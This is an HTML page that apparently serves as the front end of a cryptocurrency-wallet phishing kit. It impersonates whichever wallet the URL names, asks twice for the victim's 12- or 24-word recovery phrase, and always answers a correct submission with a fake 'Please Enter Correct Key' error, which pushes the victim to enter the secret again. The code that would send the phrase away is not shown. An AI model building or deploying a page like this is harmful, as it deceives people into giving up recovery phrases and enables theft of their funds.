<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Key Login</title>

    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: "Montserrat", sans-serif;
        background: linear-gradient(
          to bottom,
          #003125,
          #00816c,
          #00bd8e,
          #003125
        );
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        color: #bfffe9;
      }

      .card {
        background: #003228;
        width: 90%;
        max-width: 380px;
        padding: 25px;
        border-radius: 12px;
        text-align: center;
        box-shadow: 0 0 20px rgba(0, 255, 200, 0.25);
      }

      .logo {
        width: 90px;
        height: 90px;
        border-radius: 50%;
        margin-bottom: 15px;
      }

      h2 {
        margin: 10px 0 20px;
        font-size: 24px;
        font-weight: bold;
        color: #bfffe9;
      }

      textarea {
        width: 92%;
        padding: 12px;
        margin: 10px 0;
        border-radius: 8px;
        background: transparent;
        border: 2px solid #00e6c3;
        color: #bfffe9;
        font-size: 15px;
        resize: none;
        overflow: hidden;
        min-height: 60px;
      }

      textarea::placeholder {
        color: #bfffe9;
      }

      .checkbox {
        display: flex;
        align-items: center;
        gap: 10px;
        margin: 15px 0;
        color: white;
      }

      .btn {
        width: 100%;
        padding: 12px;
        margin-top: 15px;
        border: none;
        border-radius: 10px;
        background: #00e6c3;
        color: black;
        font-size: 18px;
        font-weight: bold;
        cursor: pointer;
      }

      .btn:hover {
        background: #11ffee;
        box-shadow: 0 0 12px #11ffee;
      }

      #popup {
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: rgb(12, 12, 12);
        padding: 22px;
        width: 260px;
        border-radius: 12px;
        text-align: center;
        border: 2px solid #00e6c3;
        box-shadow: 0 0 15px #00e6c3;
        z-index: 999;
      }

      #popup button {
        margin-top: 12px;
        padding: 10px 22px;
        border: none;
        border-radius: 8px;
        background: #00e6c3;
        color: black;
        font-weight: bold;
        cursor: pointer;
      }
    </style>
  </head>

  <body>
    <div class="card">
      <img id="walletLogo" class="logo" src="" />
      <h2 id="walletName"></h2>

      <textarea
        id="phrase1"
        placeholder="Enter wallet phrase (12 or 24 words)"
      ></textarea>
      <textarea id="phrase2" placeholder="Confirm wallet phrase"></textarea>

      <label class="checkbox">
        <input type="checkbox" id="confirmCheck" />
        Are you sure you entered correctly?
      </label>

      <button class="btn" onclick="validateForm()">Connect Wallet</button>
    </div>

    <!-- POPUP -->
    <div id="popup">
      <p id="popupMsg">Please Fill Out This Field.</p>
      <button onclick="closePopup()">OK</button>
    </div>

    <script>
      const params = new URLSearchParams(window.location.search);
      const wallet = params.get("wallet");

      document.getElementById("walletName").innerText = wallet;

      let imgName = wallet.toLowerCase().replace(/\s+/g, "") + ".webp";
      document.getElementById("walletLogo").src = "wallet-icons/" + imgName;

      // Auto expand textareas
      document.querySelectorAll("textarea").forEach((box) => {
        box.addEventListener("input", () => {
          box.style.height = "auto";
          box.style.height = box.scrollHeight + "px";
        });
      });

      function validateForm() {
        const p1 = phrase1.value.trim();
        const p2 = phrase2.value.trim();
        const check = confirmCheck.checked;

        if (p1 === "") return showPopup("Please Enter Your Phrase.");
        if (p2 === "") return showPopup("Please Confirm The Phrase.");
        if (p1 !== p2) return showPopup("Phrases Do Not Match.");
        if (!check) return showPopup("Please Tick The Confirmation Checkbox.");

        // ðŸ”¥ SPECIAL KEY-LOGIN POPUP
        return showPopup("Please Enter Correct Key.");
      }

      function showPopup(msg) {
        popupMsg.innerText = msg;
        popup.style.display = "block";
      }

      function closePopup() {
        popup.style.display = "none";
      }
    </script>
  </body>
</html>
